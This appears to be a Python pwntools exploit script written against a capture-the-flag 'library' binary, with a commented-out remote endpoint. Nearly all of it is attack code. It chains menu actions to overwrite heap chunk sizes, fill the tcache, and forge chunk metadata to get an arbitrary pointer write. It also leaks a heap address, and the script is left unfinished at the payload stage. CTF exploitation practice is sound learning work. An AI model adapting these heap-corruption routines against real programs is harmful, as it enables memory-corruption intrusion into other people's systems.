from pwn import *

### arbitrary_pointer_write metadata ###
ARB_PTR_WRITE_CHK_ID = 0
ARB_CHK_ID_B = 0
EDITOR_CHK = 0
SAFE_CHK = 0

CHK_USR = p64(0x31) + p64(0) + p64(0x20) + b'\x30\x12'
CHK_PWD = p64(0) + p64(0) + p64(0x21)# + p64(0x61) + b'\x61'


def register(p: process, username: str = "user", password: str = "12345"):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Username: ", username)
    p.sendlineafter("Password: ", password)

def login(p: process, username: str = "user", password: str = "12345"):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Username: ", username)
    p.sendlineafter("Password: ", password)

def borrow_book(p: process, book_idx: int = 0):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Which book do you want? ", str(book_idx))

def del_comment(p: process, id: int, book_idx: int = 0):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Which book did you leave the comment on? ", str(book_idx))
    p.sendlineafter("What is the comment id? ", str(id))
    print("deleted: ", id)

def return_book(p: process, add_comment: bool = False, comment_len: int = 50, comment: str = "comment", title: str = "title") -> int:
    id = 0
    p.sendlineafter("Your choice: ", "2")
    if add_comment:
        p.sendlineafter("do you want to leave a comment? [Y/n] ", 'Y')
        p.sendlineafter("size of the comment: ", str(comment_len))
        p.sendlineafter("title: ", title)
        p.sendlineafter("content: ", comment)
        p.recvuntil("Comment ")
        id = int(p.recvuntil(" ").decode())
        print("id: ", id)
    else:
        p.sendline('n')

    return id

def logout(p: process):
    p.sendlineafter("Your choice: ", "4")

def overwrite_top_chunk_size(p: process, new_top_chunk: int):
    borrow_book(p)
    return_book(p, True, 32, (b"a" * 8) + p64(new_top_chunk))
    print("new top_chunk size:", hex(new_top_chunk & 0xFFFF_FFFF_FFFF_FFF8))

def create_heap_trap(p: process, start: int = 100):
    ids = []
    for size in range(start, 1200, 50):
        print(size)
        borrow_book(p)
        ids.append(return_book(p , True, size))
    
    for id in ids:
        del_comment(p, id)

def create_comment(p: process, size: int, comment: str = "comment", book: int = 0) -> int:
    borrow_book(p, book)
    return return_book(p, True, size, comment, "")

def overwrite_chunk_size(p: process, size: int = 0x20, old_size: int = 1200):
    size = size >> 4 #lower 3 bytes are for flags & 1 is empty
    size = size << 4
    create_heap_trap(p)
    create_heap_trap(p)
    create_heap_trap(p)
    create_heap_trap(p)
    create_comment(p, 1200)
    id = create_comment(p, 1200)
    ow_id = create_comment(p, old_size)
    del_comment(p, id)
    create_comment(p, 1200, (b"b" * (1200 - 24)) + p64(size))
    print("comment chunk: ", id, "new size: ", size, "old size: ", old_size)
    return ow_id

def fill_tcache(p: process, size: int, chunks: int = 7):
    ids = []
    for _ in range(chunks):
        #create_comment(p, 1200)
        ids.append(create_comment(p, size, "a"))

    for id in ids:
        del_comment(p, id)

def arb_ptr_write_init(p: process):
    global ARB_PTR_WRITE_CHK_ID
    global ARB_CHK_ID_B
    global EDITOR_CHK
    global SAFE_CHK

    id0 = create_comment(p, 0x1024)
    id1 = create_comment(p, 0x1024)
    id2 = create_comment(p, 0x1024)
    del_comment(p, id0)
    del_comment(p, id1)    

    EDITOR_CHK = create_comment(p, 0x1200)
    SAFE_CHK = create_comment(p, 0x1200)
    TMP_CHK = create_comment(p, 0x1200)
    
    del_comment(p, SAFE_CHK)
    SAFE_CHK = create_comment(p, 0x11a0)

    logout(p)
    register(p, CHK_USR, CHK_PWD)
    register(p)
    login(p, CHK_USR, CHK_PWD)
    borrow_book(p, 2)
    logout(p)
    login(p)

    del_comment(p, EDITOR_CHK)
    EDITOR_CHK = create_comment(p, 0x1200, b'a' * (0x1200 - 0x20) + p64(0) + p64(0x11f1))

    del_comment(p, SAFE_CHK)
    SAFE_CHK = create_comment(p, 0x11e0, b'Y' * (0x11f0 - 0x58) + p64(0x6161) + (p64(0) * 3) + p64(0x6262) + p64(0) * 3)

    p.interactive()


def arb_re_write_chk(p: process):
    global ARB_PTR_WRITE_CHK_ID
    global EDITOR_CHK
    print("EDITOR_CHK:", EDITOR_CHK)
    #del_comment(p, EDITOR_CHK)
    p.interactive()
    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
    p.interactive()
    del_comment(p, ARB_PTR_WRITE_CHK_ID)

    del_comment(p, EDITOR_CHK)
    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1261))

    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1250, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + p64(0x60))

def arbitrary_pointer_write(p: process, addr: int, data: str):
    global ARB_PTR_WRITE_CHK_ID
    del_comment(p, ARB_PTR_WRITE_CHK_ID)
    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x2000, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161) + (b"b" * 0x18) + p64(addr))
    logout(p)
    login(p, CHK_USR, CHK_PWD)
    return_book(p, True, len(data) + 0x30, data)
    
def parse_heap_leak_line(line: str):
    real_line = b'the full guide to insanity: heap exploitation" by rozav\n' + b'a' * 10 #padding
    addr = 0
    data = b''
    ok = False
    for rch, ch in zip(real_line, line[4:]):
        if ch == ord('"'):
            break
        if ch != rch:
            ok = True
        if ok:
            data += bytes([ch])

    return int.from_bytes(data, 'little')

def leak_heap(p: process):
    global ARB_PTR_WRITE_CHK_ID
    global ARB_CHK_ID_B
    global EDITOR_CHK
    global SAFE_CHK

    logout(p)
    login(p, CHK_USR, CHK_PWD)
    borrow_book(p, 2)
    logout(p)
    login(p)
    #p.interactive()
    del_comment(p, 0, 4)
    SAFE_CHK = create_comment(p, 0x10, p64(0x90), 3)

    logout(p)
    login(p, CHK_USR, p64(SAFE_CHK))
    return_book(p, True, 0x50, "hey", "noam")
    print("SAFE_CHK:", SAFE_CHK)
    p.sendline("1")
    p.recvuntil("choice")
    for i in range(2):
        p.recvline()
    line = p.recvline()

    leak = parse_heap_leak_line(line)
    print("heap leak: ", hex(leak))
    return leak

def main():
    ### run ###
    p = process("./library")
    #p = remote("pwnable.co.il", 9010)

    ### setup ###
    register(p, "user", "12345")
    register(p, "user1", "12345")
    login(p)

    ### init ###
    arb_ptr_write_init(p)

    ### leaks ###
    heap_leak = leak_heap(p)
    
    ### payload start ###
    p.interactive() 

if __name__ == "__main__":
    main()